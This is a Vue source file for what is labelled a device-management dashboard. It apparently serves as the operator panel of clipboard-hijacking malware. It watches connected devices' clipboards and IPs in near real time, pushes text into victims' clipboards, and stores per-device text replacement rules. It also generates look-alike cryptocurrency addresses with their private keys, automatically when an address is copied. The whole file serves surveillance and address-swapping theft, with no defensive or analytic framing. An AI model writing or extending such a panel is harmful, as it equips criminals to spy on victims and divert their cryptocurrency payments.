<script setup lang="ts">
import { onMounted, onUnmounted, ref, computed, watch } from 'vue'
import { listDevices, updateNote, updateAutoGenerate, pushSet, generateSimilar, getGeneratedAddresses, getDeviceReplacementPairs, createReplacementPair, updateReplacementPair, deleteReplacementPair } from '../api'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Plus, Edit, Delete } from '@element-plus/icons-vue'

type Device = { 
  deviceId: string
  fingerprint?: string
  ip?: string
  note?: string
  lastClipText?: string
  lastSeen: number
  connected: boolean
  autoGenerate?: boolean
}

type ReplacementPair = {
  id: number
  device_id: string
  original_text: string
  replacement_text: string
  enabled: boolean
  created_at: number
  updated_at: number
}

const rows = ref<Device[]>([])
const loading = ref(false)
const search = ref('')
const pushText = ref('')
const selectedRows = ref<Device[]>([])
const showPushDialog = ref(false)
const pushTarget = ref<Device | null>(null)

// 生成相似地址相关
const showGenerateDialog = ref(false)
const generateTarget = ref<Device | null>(null)
const generating = ref(false)
const generatedResult = ref<any>(null)
const showHistoryDialog = ref(false)
const addressHistory = ref<any[]>([])

// 替换对相关
const showReplacementDialog = ref(false)
const replacementTarget = ref<Device | null>(null)
const replacementPairs = ref<ReplacementPair[]>([])
const replacementFormData = ref({
  original_text: '',
  replacement_text: '',
  enabled: true
})
const editingPair = ref<ReplacementPair | null>(null)
const showReplacementForm = ref(false)

// 分页
const currentPage = ref(1)
const pageSize = ref(10)

// 自动刷新状态
const autoRefresh = ref(true)
const lastRefreshTime = ref<Date | null>(null)

const load = async (silent = false) => {
  // 只有首次加载或手动刷新时显示loading
  if (!silent) {
    loading.value = true
  }
  try {
    const { data } = await listDevices()
    rows.value = data
    lastRefreshTime.value = new Date()
  } catch (error) {
    // 静默刷新时不显示错误
    if (!silent) {
      ElMessage.error('加载设备列表失败')
    }
  } finally {
    loading.value = false
  }
}

// 保存备注
const saveNote = async (row: Device) => {
  try {
    await updateNote(row.deviceId, row.note || '')
    ElMessage.success('备注更新成功')
  } catch (error) {
    ElMessage.error('更新备注失败')
  }
}

// 切换自动生成开关
const toggleAutoGenerate = async (row: Device) => {
  try {
    // 处理 undefined 的情况，默认为 true
    const currentValue = row.autoGenerate !== false
    const newValue = !currentValue
    await updateAutoGenerate(row.deviceId, newValue)
    row.autoGenerate = newValue
    ElMessage.success(newValue ? '已开启自动生成' : '已关闭自动生成')
  } catch (error) {
    ElMessage.error('更新失败')
    // 恢复原值
    row.autoGenerate = !row.autoGenerate
  }
}

// 推送剪贴板
const openPushDialog = (row: Device) => {
  pushTarget.value = row
  pushText.value = ''
  showPushDialog.value = true
}

const doPush = async () => {
  if (!pushTarget.value || !pushText.value.trim()) {
    ElMessage.warning('请输入要推送的内容')
    return
  }

  try {
    const { data } = await pushSet(pushTarget.value.deviceId, pushText.value)
    if (!data.ok) {
      ElMessage.error(data.error || '推送失败')
    } else if (data.delivered) {
      ElMessage.success(`内容已推送到 ${pushTarget.value.deviceId}`)
      showPushDialog.value = false
      // 推送成功后立即刷新列表
      await load()
    } else {
      ElMessage.warning('设备离线，推送失败')
    }
  } catch (error) {
    ElMessage.error('推送内容失败')
  }
}

// 生成相似地址
const openGenerateDialog = (row: Device) => {
  if (!row.lastClipText) {
    ElMessage.warning('设备剪贴板为空')
    return
  }
  generateTarget.value = row
  generatedResult.value = null
  showGenerateDialog.value = true
}

const doGenerate = async () => {
  if (!generateTarget.value) return
  
  generating.value = true
  try {
    const { data } = await generateSimilar(generateTarget.value.deviceId)
    if (data.success) {
      generatedResult.value = data.data
      ElMessage.success('相似地址生成成功！')
    } else {
      ElMessage.error(data.error || '生成失败')
    }
  } catch (error) {
    ElMessage.error('生成相似地址失败')
  } finally {
    generating.value = false
  }
}

// 查看历史记录
const viewHistory = async (row: Device) => {
  try {
    const { data } = await getGeneratedAddresses(row.deviceId)
    addressHistory.value = data.addresses
    showHistoryDialog.value = true
  } catch (error) {
    ElMessage.error('获取历史记录失败')
  }
}

// 复制到剪贴板
const copyToClipboard = (text: string) => {
  navigator.clipboard.writeText(text).then(() => {
    ElMessage.success('已复制到剪贴板')
  }).catch(() => {
    ElMessage.error('复制失败')
  })
}

// 批量推送
const batchPush = async () => {
  if (selectedRows.value.length === 0) {
    ElMessage.warning('请先选择设备')
    return
  }

  try {
    const content = await ElMessageBox.prompt(
      '输入要推送到选中设备的内容',
      '批量推送',
      {
        confirmButtonText: '推送',
        cancelButtonText: '取消',
        inputType: 'textarea',
        inputPlaceholder: '输入文本内容...'
      }
    )

    let successCount = 0
    let failCount = 0
    
    const promises = selectedRows.value.map(async device => {
      try {
        const { data } = await pushSet(device.deviceId, content.value)
        if (!data.ok) {
          failCount++
          console.error(`推送到 ${device.deviceId} 失败: ${data.error}`)
        } else if (data.delivered) {
          successCount++
        } else {
          failCount++
        }
      } catch {
        failCount++
      }
    })
    
    await Promise.all(promises)
    
    if (successCount > 0) {
      ElMessage.success(`成功推送到 ${successCount} 个设备`)
    }
    if (failCount > 0) {
      ElMessage.warning(`${failCount} 个设备推送失败（可能离线或剪贴板为空）`)
    }
    
    selectedRows.value = []
    // 批量推送后刷新列表
    await load()
  } catch {
    // 用户取消
  }
}

// 过滤设备
const filtered = computed(() => {
  const searchLower = search.value.toLowerCase()
  return rows.value.filter(r => 
    !searchLower || 
    r.deviceId.toLowerCase().includes(searchLower) || 
    (r.ip || '').toLowerCase().includes(searchLower) ||
    (r.note || '').toLowerCase().includes(searchLower)
  )
})

// 分页数据
const paginatedData = computed(() => {
  const start = (currentPage.value - 1) * pageSize.value
  const end = start + pageSize.value
  return filtered.value.slice(start, end)
})

// 格式化时间
const formatTime = (timestamp: number) => {
  const date = new Date(timestamp * 1000)
  const now = new Date()
  const diff = now.getTime() - date.getTime()
  
  if (diff < 60000) return '刚刚'
  if (diff < 3600000) return `${Math.floor(diff / 60000)} 分钟前`
  if (diff < 86400000) return `${Math.floor(diff / 3600000)} 小时前`
  return date.toLocaleDateString()
}

// 选择变化处理
const handleSelectionChange = (val: Device[]) => {
  selectedRows.value = val
}

// 替换对管理功能
const openReplacementDialog = async (row: Device) => {
  replacementTarget.value = row
  showReplacementDialog.value = true
  showReplacementForm.value = false
  editingPair.value = null
  
  // 加载该设备的替换对
  try {
    const { data } = await getDeviceReplacementPairs(row.deviceId)
    replacementPairs.value = data.pairs
  } catch (error) {
    ElMessage.error('加载替换对失败')
  }
}

const openReplacementForm = (pair?: ReplacementPair) => {
  if (pair) {
    editingPair.value = pair
    replacementFormData.value = {
      original_text: pair.original_text,
      replacement_text: pair.replacement_text,
      enabled: pair.enabled
    }
  } else {
    editingPair.value = null
    replacementFormData.value = {
      original_text: '',
      replacement_text: '',
      enabled: true
    }
  }
  showReplacementForm.value = true
}

const saveReplacementPair = async () => {
  if (!replacementFormData.value.original_text || !replacementFormData.value.replacement_text) {
    ElMessage.warning('请填写原文本和替换文本')
    return
  }
  
  try {
    if (editingPair.value) {
      // 更新
      await updateReplacementPair(editingPair.value.id, replacementFormData.value)
      ElMessage.success('更新成功')
    } else {
      // 创建
      await createReplacementPair({
        device_id: replacementTarget.value!.deviceId,
        original_text: replacementFormData.value.original_text,
        replacement_text: replacementFormData.value.replacement_text
      })
      ElMessage.success('创建成功')
    }
    
    // 重新加载替换对列表
    const { data } = await getDeviceReplacementPairs(replacementTarget.value!.deviceId)
    replacementPairs.value = data.pairs
    showReplacementForm.value = false
  } catch (error) {
    ElMessage.error(editingPair.value ? '更新失败' : '创建失败')
  }
}

const deleteReplacementPairItem = async (pair: ReplacementPair) => {
  try {
    await ElMessageBox.confirm(
      `确定要删除这个替换对吗？\n${pair.original_text} → ${pair.replacement_text}`,
      '删除确认',
      {
        confirmButtonText: '删除',
        cancelButtonText: '取消',
        type: 'warning'
      }
    )
    
    await deleteReplacementPair(pair.id)
    ElMessage.success('删除成功')
    
    // 重新加载替换对列表
    const { data } = await getDeviceReplacementPairs(replacementTarget.value!.deviceId)
    replacementPairs.value = data.pairs
  } catch (error) {
    if (error !== 'cancel') {
      ElMessage.error('删除失败')
    }
  }
}

const togglePairEnabled = async (pair: ReplacementPair) => {
  try {
    await updateReplacementPair(pair.id, { enabled: !pair.enabled })
    pair.enabled = !pair.enabled
    ElMessage.success(pair.enabled ? '已启用' : '已禁用')
  } catch (error) {
    ElMessage.error('操作失败')
  }
}

// 监听搜索变化，重置页码
watch(search, () => {
  currentPage.value = 1
})

// 自动刷新定时器
const refreshTimer = ref<number | null>(null)

// 切换自动刷新
const toggleAutoRefresh = () => {
  if (autoRefresh.value) {
    if (refreshTimer.value) {
      clearInterval(refreshTimer.value)
      refreshTimer.value = null
    }
  } else {
    refreshTimer.value = window.setInterval(() => load(true), 1500)
  }
}

// 监听自动刷新状态变化
watch(autoRefresh, (newVal) => {
  toggleAutoRefresh()
})

onMounted(() => {
  load()
  // 每1.5秒静默刷新一次，实现近实时更新
  if (autoRefresh.value) {
    refreshTimer.value = window.setInterval(() => load(true), 1500)
  }
})

// 组件卸载时清理定时器
onUnmounted(() => {
  if (refreshTimer.value) {
    clearInterval(refreshTimer.value)
  }
})
</script>

<template>
  <div class="devices-container">
    <!-- 页面标题 -->
    <div class="page-header animate__animated animate__fadeInDown">
      <h2 class="page-title">设备管理</h2>
      <p class="page-subtitle">监控和管理所有连接的剪贴板设备</p>
    </div>

    <!-- 工具栏 -->
    <el-card class="toolbar-card animate__animated animate__fadeIn">
      <div class="toolbar">
        <div class="toolbar-left">
          <el-input 
            v-model="search" 
            placeholder="按设备ID、IP或备注搜索..." 
            prefix-icon="Search"
            clearable
            style="width: 300px;"
          />
          <el-button @click="load()" :loading="loading">
            <Refresh style="margin-right: 5px;" />
            刷新
          </el-button>
          <el-tooltip :content="autoRefresh ? '自动刷新已开启 (每1.5秒)' : '自动刷新已关闭'" placement="top">
            <el-switch 
              v-model="autoRefresh" 
              active-text="自动刷新"
              style="margin-left: 12px;"
            />
          </el-tooltip>
        </div>
        <div class="toolbar-right">
          <el-badge :value="selectedRows.length" :hidden="selectedRows.length === 0">
            <el-button 
              type="primary" 
              @click="batchPush"
              :disabled="selectedRows.length === 0"
            >
              <Upload style="margin-right: 5px;" />
              批量推送
            </el-button>
          </el-badge>
        </div>
      </div>
    </el-card>

    <!-- 统计信息 -->
    <el-row :gutter="20" class="stats-row">
      <el-col :span="6">
        <div class="mini-stat">
          <div class="mini-stat-icon" style="background: #667eea;">
            <Monitor />
          </div>
          <div class="mini-stat-content">
            <div class="mini-stat-value">{{ rows.length }}</div>
            <div class="mini-stat-label">总设备数</div>
          </div>
        </div>
      </el-col>
      <el-col :span="6">
        <div class="mini-stat">
          <div class="mini-stat-icon" style="background: #67c23a;">
            <Connection />
          </div>
          <div class="mini-stat-content">
            <div class="mini-stat-value">{{ rows.filter(r => r.connected).length }}</div>
            <div class="mini-stat-label">在线</div>
          </div>
        </div>
      </el-col>
      <el-col :span="6">
        <div class="mini-stat">
          <div class="mini-stat-icon" style="background: #e6a23c;">
            <OfflineDevice />
          </div>
          <div class="mini-stat-content">
            <div class="mini-stat-value">{{ rows.filter(r => !r.connected).length }}</div>
            <div class="mini-stat-label">离线</div>
          </div>
        </div>
      </el-col>
      <el-col :span="6">
        <div class="mini-stat">
          <div class="mini-stat-icon" style="background: #909399;">
            <Search />
          </div>
          <div class="mini-stat-content">
            <div class="mini-stat-value">{{ filtered.length }}</div>
            <div class="mini-stat-label">过滤结果</div>
          </div>
        </div>
      </el-col>
    </el-row>

    <!-- 设备表格 -->
    <el-card class="table-card animate__animated animate__fadeInUp">
      <el-table 
        :data="paginatedData" 
        v-loading="loading"
        @selection-change="handleSelectionChange"
        style="width: 100%"
        :row-class-name="({row}) => row.connected ? '' : 'offline-row'"
      >
        <el-table-column type="selection" width="50" />
        
        <el-table-column label="设备ID" min-width="200" show-overflow-tooltip>
          <template #default="{ row }">
            <div class="device-id">
              <el-tooltip :content="row.deviceId" placement="top">
                <span class="device-id-text">{{ row.deviceId }}</span>
              </el-tooltip>
              <el-button 
                text 
                size="small" 
                @click="() => navigator.clipboard.writeText(row.deviceId)"
              >
                <CopyDocument />
              </el-button>
            </div>
          </template>
        </el-table-column>
        
        <el-table-column prop="ip" label="IP地址" width="140">
          <template #default="{ row }">
            <el-tag v-if="row.ip" type="info" size="small">{{ row.ip }}</el-tag>
            <span v-else style="color: var(--text-placeholder);">-</span>
          </template>
        </el-table-column>
        
        <el-table-column label="状态" width="100">
          <template #default="{ row }">
            <div class="status-cell">
              <span :class="['status-dot', row.connected ? 'status-online' : 'status-offline']"></span>
              <span>{{ row.connected ? '在线' : '离线' }}</span>
            </div>
          </template>
        </el-table-column>
        
        <el-table-column label="最后剪贴板" min-width="200" show-overflow-tooltip>
          <template #default="{ row }">
            <div v-if="row.lastClipText" class="clipboard-preview">
              <span class="clipboard-text">{{ row.lastClipText }}</span>
              <el-button 
                text 
                size="small"
                @click="() => navigator.clipboard.writeText(row.lastClipText)"
              >
                <CopyDocument />
              </el-button>
            </div>
            <span v-else style="color: var(--text-placeholder);">无剪贴板数据</span>
          </template>
        </el-table-column>
        
        <el-table-column label="备注" width="200">
          <template #default="{ row }">
            <el-input 
              v-model="row.note" 
              placeholder="添加备注..."
              size="small"
              @change="() => saveNote(row)"
            />
          </template>
        </el-table-column>

        <el-table-column label="自动生成" width="100" align="center">
          <template #default="{ row }">
            <el-tooltip :content="row.autoGenerate !== false ? '收到地址时自动生成相似地址' : '不自动生成'" placement="top">
              <el-switch 
                :model-value="row.autoGenerate !== false"
                @change="() => toggleAutoGenerate(row)"
                :loading="false"
              />
            </el-tooltip>
          </template>
        </el-table-column>

        <el-table-column label="最后在线" width="150">
          <template #default="{ row }">
            <el-tooltip :content="new Date(row.lastSeen * 1000).toLocaleString()" placement="top">
              <span class="time-text">{{ formatTime(row.lastSeen) }}</span>
            </el-tooltip>
          </template>
        </el-table-column>
        
        <el-table-column label="操作" width="320" fixed="right">
          <template #default="{ row }">
            <el-button 
              type="primary"
              size="small"
              @click="openPushDialog(row)"
              :disabled="!row.connected"
            >
              <Upload style="margin-right: 4px;" />
              推送
            </el-button>
            <el-button
              size="small"
              @click="openGenerateDialog(row)"
              :disabled="!row.lastClipText"
            >
              <Key style="margin-right: 4px;" />
              生成
            </el-button>
            <el-button
              size="small"
              @click="viewHistory(row)"
            >
              <Clock style="margin-right: 4px;" />
              历史
            </el-button>
            <el-button
              size="small"
              @click="openReplacementDialog(row)"
            >
              <Switch style="margin-right: 4px;" />
              替换对
            </el-button>
          </template>
        </el-table-column>
      </el-table>

      <!-- 分页 -->
      <div class="pagination-container">
        <el-pagination
          v-model:current-page="currentPage"
          v-model:page-size="pageSize"
          :page-sizes="[10, 20, 50, 100]"
          :total="filtered.length"
          layout="total, sizes, prev, pager, next, jumper"
          background
        />
      </div>
    </el-card>

    <!-- 推送对话框 -->
    <el-dialog 
      v-model="showPushDialog" 
      title="推送剪贴板内容"
      width="500px"
      :close-on-click-modal="false"
    >
      <div v-if="pushTarget" class="push-dialog-content">
        <div class="push-target-info">
          <span>目标设备：</span>
          <el-tag>{{ pushTarget.deviceId }}</el-tag>
        </div>
        <el-input
          v-model="pushText"
          type="textarea"
          :rows="5"
          placeholder="输入要推送的内容..."
          maxlength="1000"
          show-word-limit
        />
      </div>
      <template #footer>
        <el-button @click="showPushDialog = false">取消</el-button>
        <el-button type="primary" @click="doPush" :disabled="!pushText.trim()">
          <Upload style="margin-right: 4px;" />
          Push
        </el-button>
      </template>
    </el-dialog>

    <!-- 生成相似地址对话框 -->
    <el-dialog
      v-model="showGenerateDialog"
      title="生成相似地址"
      width="600px"
      :close-on-click-modal="false"
    >
      <div v-if="generateTarget" class="generate-dialog-content">
        <div class="info-item">
          <span class="label">设备ID：</span>
          <el-tag>{{ generateTarget.deviceId }}</el-tag>
        </div>
        <div class="info-item">
          <span class="label">原始地址：</span>
          <el-text type="info">{{ generateTarget.lastClipText }}</el-text>
        </div>
        
        <div v-if="generating" class="generating-tip">
          <el-text type="info">
            <el-icon class="is-loading"><Loading /></el-icon>
            正在使用GPU加速生成相似地址，请稍候...
          </el-text>
        </div>
        
        <div v-if="generatedResult" class="result-section">
          <el-divider />
          <h4>生成结果</h4>
          <div class="info-item">
            <span class="label">地址类型：</span>
            <el-tag type="success">{{ generatedResult.address_type }}</el-tag>
          </div>
          <div class="info-item">
            <span class="label">生成地址：</span>
            <el-text class="address-text">{{ generatedResult.generated_address }}</el-text>
            <el-button size="small" @click="copyToClipboard(generatedResult.generated_address)">
              <CopyDocument />
            </el-button>
          </div>
          <div class="info-item">
            <span class="label">私钥：</span>
            <el-text class="private-key">{{ generatedResult.private_key }}</el-text>
            <el-button size="small" @click="copyToClipboard(generatedResult.private_key)">
              <CopyDocument />
            </el-button>
          </div>
          <div class="info-item">
            <span class="label">生成耗时：</span>
            <el-text>{{ generatedResult.generation_time?.toFixed(2) }}秒</el-text>
          </div>
          <div class="info-item">
            <span class="label">尝试次数：</span>
            <el-text>{{ generatedResult.attempts?.toLocaleString() }}次</el-text>
          </div>
        </div>
      </div>
      <template #footer>
        <el-button @click="showGenerateDialog = false">关闭</el-button>
        <el-button 
          type="primary" 
          @click="doGenerate" 
          :loading="generating"
          :disabled="generating || !!generatedResult"
        >
          {{ generating ? '生成中...' : '开始生成' }}
        </el-button>
      </template>
    </el-dialog>

    <!-- 历史记录对话框 -->
    <el-dialog
      v-model="showHistoryDialog"
      title="生成历史"
      width="80%"
      top="5vh"
    >
      <el-table :data="addressHistory" style="width: 100%">
        <el-table-column prop="created_at" label="生成时间" width="180">
          <template #default="{ row }">
            {{ new Date(row.created_at * 1000).toLocaleString() }}
          </template>
        </el-table-column>
        <el-table-column prop="address_type" label="类型" width="100" />
        <el-table-column prop="original_address" label="原始地址" />
        <el-table-column prop="generated_address" label="生成地址" />
        <el-table-column label="操作" width="160">
          <template #default="{ row }">
            <el-button size="small" @click="copyToClipboard(row.generated_address)">
              复制地址
            </el-button>
            <el-button size="small" @click="copyToClipboard(row.private_key)">
              复制私钥
            </el-button>
          </template>
        </el-table-column>
      </el-table>
    </el-dialog>

    <!-- 替换对管理对话框 -->
    <el-dialog
      v-model="showReplacementDialog"
      :title="`替换对管理 - ${replacementTarget?.deviceId}`"
      width="70%"
      top="5vh"
    >
      <div v-if="!showReplacementForm">
        <!-- 工具栏 -->
        <div style="margin-bottom: 16px;">
          <el-button type="primary" @click="openReplacementForm()">
            <Plus style="margin-right: 5px;" />
            添加替换对
          </el-button>
        </div>
        
        <!-- 替换对列表 -->
        <el-table :data="replacementPairs" style="width: 100%">
          <el-table-column label="原文本" min-width="200" show-overflow-tooltip>
            <template #default="{ row }">
              <div class="text-content">
                <span class="text-preview">{{ row.original_text }}</span>
                <el-button 
                  text 
                  size="small"
                  @click="() => navigator.clipboard.writeText(row.original_text)"
                >
                  <CopyDocument />
                </el-button>
              </div>
            </template>
          </el-table-column>
          
          <el-table-column label="替换为" min-width="200" show-overflow-tooltip>
            <template #default="{ row }">
              <div class="text-content">
                <span class="text-preview">{{ row.replacement_text }}</span>
                <el-button 
                  text 
                  size="small"
                  @click="() => navigator.clipboard.writeText(row.replacement_text)"
                >
                  <CopyDocument />
                </el-button>
              </div>
            </template>
          </el-table-column>
          
          <el-table-column label="状态" width="100">
            <template #default="{ row }">
              <el-switch 
                v-model="row.enabled" 
                @change="() => togglePairEnabled(row)"
              />
            </template>
          </el-table-column>
          
          <el-table-column label="创建时间" width="180">
            <template #default="{ row }">
              {{ new Date(row.created_at * 1000).toLocaleString() }}
            </template>
          </el-table-column>
          
          <el-table-column label="操作" width="120">
            <template #default="{ row }">
              <el-button 
                size="small"
                :icon="Edit"
                @click="openReplacementForm(row)"
              />
              <el-button 
                type="danger"
                size="small"
                :icon="Delete"
                @click="deleteReplacementPairItem(row)"
              />
            </template>
          </el-table-column>
        </el-table>
        
        <el-empty v-if="replacementPairs.length === 0" description="暂无替换对" />
      </div>
      
      <!-- 创建/编辑表单 -->
      <div v-else>
        <el-form :model="replacementFormData" label-width="100px">
          <el-form-item label="原文本" required>
            <el-input 
              v-model="replacementFormData.original_text" 
              type="textarea"
              :rows="3"
              placeholder="输入要替换的原文本..."
            />
          </el-form-item>
          
          <el-form-item label="替换为" required>
            <el-input 
              v-model="replacementFormData.replacement_text" 
              type="textarea"
              :rows="3"
              placeholder="输入替换后的文本..."
            />
          </el-form-item>
          
          <el-form-item label="启用">
            <el-switch v-model="replacementFormData.enabled" />
          </el-form-item>
        </el-form>
        
        <div style="text-align: right; margin-top: 20px;">
          <el-button @click="showReplacementForm = false">取消</el-button>
          <el-button type="primary" @click="saveReplacementPair">
            {{ editingPair ? '更新' : '创建' }}
          </el-button>
        </div>
      </div>
    </el-dialog>
  </div>
</template>

<style scoped>
.devices-container {
  max-width: 1400px;
  margin: 0 auto;
  padding: 0 24px;
  width: 100%;
  box-sizing: border-box;
}

/* 页面头部 */
.page-header {
  margin-bottom: 20px;
}

.page-title {
  font-size: 28px;
  font-weight: 700;
  color: var(--text-primary);
  margin: 0 0 8px;
}

.page-subtitle {
  font-size: 14px;
  color: var(--text-secondary);
  margin: 0;
}

/* 工具栏 */
.toolbar-card {
  margin-bottom: 20px;
}

.toolbar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 16px;
}

.toolbar-left,
.toolbar-right {
  display: flex;
  align-items: center;
  gap: 12px;
}

/* 统计信息 */
.stats-row {
  margin-bottom: 20px;
}

.mini-stat {
  background: var(--bg-color);
  border-radius: 8px;
  padding: 16px;
  display: flex;
  align-items: center;
  gap: 16px;
  border: 1px solid var(--border-lighter);
  transition: all 0.3s;
}

.mini-stat:hover {
  box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
  transform: translateY(-2px);
}

.mini-stat-icon {
  width: 48px;
  height: 48px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
  font-size: 24px;
}

.mini-stat-content {
  flex: 1;
}

.mini-stat-value {
  font-size: 24px;
  font-weight: 700;
  color: var(--text-primary);
  line-height: 1;
}

.mini-stat-label {
  font-size: 12px;
  color: var(--text-secondary);
  margin-top: 4px;
}

/* 表格样式 */
.table-card {
  overflow: hidden;
}

:deep(.el-table) {
  font-size: 14px;
}

:deep(.el-table th) {
  background-color: var(--bg-page);
  color: var(--text-regular);
  font-weight: 600;
}

:deep(.offline-row) {
  opacity: 0.6;
}

.device-id {
  display: flex;
  align-items: center;
  gap: 8px;
}

.device-id-text {
  font-family: monospace;
  font-size: 13px;
}

.status-cell {
  display: flex;
  align-items: center;
  gap: 6px;
}

.status-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
}

.status-online {
  background-color: #67c23a;
  box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.2);
}

.status-offline {
  background-color: #909399;
}

.clipboard-preview {
  display: flex;
  align-items: center;
  gap: 8px;
}

.clipboard-text {
  flex: 1;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  font-size: 13px;
  color: var(--text-secondary);
}

.time-text {
  font-size: 13px;
  color: var(--text-secondary);
}

/* 分页 */
.pagination-container {
  margin-top: 20px;
  display: flex;
  justify-content: flex-end;
}

/* 推送对话框 */
.push-dialog-content {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.push-target-info {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 14px;
  color: var(--text-regular);
}

/* 生成相似地址对话框样式 */
.generate-dialog-content {
  padding: 10px 0;
}

.info-item {
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  gap: 10px;
}

.info-item .label {
  font-weight: bold;
  color: #606266;
  min-width: 100px;
}

.address-text {
  font-family: monospace;
  font-size: 13px;
  word-break: break-all;
}

.private-key {
  font-family: monospace;
  font-size: 12px;
  max-width: 300px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.result-section {
  margin-top: 20px;
}

.result-section h4 {
  margin-bottom: 16px;
  color: #303133;
}

.generating-tip {
  text-align: center;
  margin: 20px 0;
}

.generating-tip .el-icon {
  margin-right: 8px;
}

/* 响应式设计 */
@media (max-width: 1440px) {
  .devices-container {
    max-width: 1200px;
  }
}

@media (max-width: 1200px) {
  .devices-container {
    max-width: 960px;
  }
  
  .toolbar {
    flex-direction: column;
    align-items: stretch;
  }
  
  .toolbar-left,
  .toolbar-right {
    justify-content: space-between;
  }
}

@media (max-width: 992px) {
  .devices-container {
    padding: 0 16px;
  }
}

@media (max-width: 768px) {
  .stats-row .el-col {
    margin-bottom: 12px;
  }
  
  :deep(.el-table) {
    font-size: 12px;
  }
  
  .devices-container {
    padding: 0 12px;
  }
}
</style>